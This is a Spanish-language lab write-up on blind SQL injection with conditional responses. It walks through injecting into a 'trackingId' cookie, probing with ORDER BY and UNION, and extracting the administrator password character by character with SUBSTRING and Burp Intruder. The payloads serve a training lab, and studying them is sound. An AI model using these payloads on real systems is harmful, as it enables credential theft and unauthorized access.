# 💉 Inyección SQL ciega con respuestas condicionales

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL ciega (Blind SQL Injection)**.\
La aplicación utiliza una cookie llamada `trackingId` para realizar análisis internos, y ese valor se inserta directamente en una consulta SQL.

La aplicación no muestra errores ni resultados de la consulta. Sin embargo, el comportamiento de la página cambia dependiendo del resultado interno de la consulta. Si la consulta devuelve alguna fila, aparece el mensaje **“Welcome back!”**.

El objetivo es extraer la contraseña del usuario **administrator** y utilizarla para iniciar sesión en la aplicación.



## 📚 Teoría

### 📌 SQL Injection ciega basada en condiciones booleanas

En este laboratorio se explota una **Blind SQL Injection basada en respuestas condicionales**.

Las características del escenario son:

* No se muestran resultados de la consulta SQL.
* No aparecen errores del motor de base de datos.
* La respuesta de la aplicación cambia dependiendo del resultado de la consulta.

El punto vulnerable se encuentra en la cookie:

```
trackingId
```

El principio de explotación es sencillo:

1. Se inyecta una condición SQL en la consulta.
2. Si la condición es **TRUE**, la consulta devuelve resultados.
3. La aplicación muestra el mensaje **Welcome back!**.
4. Si la condición es **FALSE**, la consulta no devuelve resultados y el mensaje desaparece.

Este comportamiento permite utilizar el backend como un **oráculo booleano** para extraer información carácter por carácter.

Aunque los datos no se muestran directamente, es posible reconstruirlos utilizando funciones como:

```
SUBSTRING()
SUBSTR()
```



## 📝 Práctica

### 1️⃣ Identificar el punto vulnerable

Accedemos a la aplicación y realizamos una petición autenticada.

Interceptamos una petición HTTP y observamos la cookie:

```
trackingId=abc123
```

Probamos a introducir una comilla para romper la consulta SQL:

```
trackingId=abc123'
```

Recargamos la página.

<img width="1520" height="552" alt="image" src="https://github.com/user-attachments/assets/551f2991-f24c-460b-935a-83ae6f57cf01" />
<br>

Resultado:

El mensaje **Welcome back!** desaparece.

Esto confirma que el valor de `trackingId` se inserta directamente en una consulta SQL.



### 2️⃣ Confirmar la estructura de la consulta

Probamos a utilizar `ORDER BY` para determinar el número de columnas:

```
trackingId=abc123' ORDER BY 1--
trackingId=abc123' ORDER BY 2--
```

Resultados:

```
ORDER BY 1 → aparece Welcome back
ORDER BY 2 → no aparece Welcome back
```

Conclusión: la consulta devuelve **una sola columna**.

### 3️⃣ Confirmar que se trata de SQL Injection ciega

Probamos un ataque UNION básico:

```
trackingId=abc123' UNION SELECT 'test'--
```

<img width="1520" height="595" alt="image" src="https://github.com/user-attachments/assets/289026da-2d74-45bb-9a2e-2638dbef3335" />
<br>

Resultado:

La aplicación responde normalmente, pero no se muestra ningún dato adicional.

Esto confirma que:

* La inyección SQL funciona.
* Los resultados de la consulta no se reflejan en la página.

Estamos ante una **Blind SQL Injection real**.



### 4️⃣ Extraer la contraseña mediante condiciones booleanas

Sabemos que existe una tabla:

```
users(username, password)
```

Podemos comprobar caracteres específicos de la contraseña utilizando `SUBSTRING`.

Ejemplo de payload:

```
trackingId=abc123' AND 
(SELECT SUBSTRING(password,1,1) 
FROM users 
WHERE username='administrator')='a'--
```

<img width="1520" height="598" alt="image" src="https://github.com/user-attachments/assets/d97a3e60-d2a8-4c1d-9b1d-f3957c7ee512" />
<br>

Interpretación:

* Si el primer carácter de la contraseña es **a**, aparece el mensaje **Welcome back!**.
* Si no lo es, el mensaje no aparece.

Repitiendo este proceso es posible descubrir cada carácter.



### 5️⃣ Automatizar la extracción con Burp Intruder

Para evitar hacerlo manualmente, utilizamos **Burp Intruder**.

Configuramos el payload:

```
trackingId=abc123' AND 
(SELECT SUBSTRING(password,§1§,1) 
FROM users 
WHERE username='administrator')='§2§'--
```

Payloads:

* Posición del carácter: 1–25
* Valores posibles:\
  a–z\
  A–Z\
  0–9

<img width="1520" height="513" alt="image" src="https://github.com/user-attachments/assets/d14b0d53-29b4-4b8c-ae67-cead757be9b5" />
<br>

Configuramos **Grep - Match** buscando:

```
Welcome back!
```

Las respuestas que contienen ese texto indican que la condición SQL fue verdadera.



### 6️⃣ Reconstruir la contraseña

A partir de los resultados obtenidos con Intruder:

* Se identifica un carácter válido para cada posición.
* Se reconstruye la contraseña completa.

Ejemplo conceptual:

```
j4k3r0ck5!
```

El valor exacto puede variar dependiendo de la instancia del laboratorio.

Accedemos al formulario de login de la aplicación e introducimos:

```

```
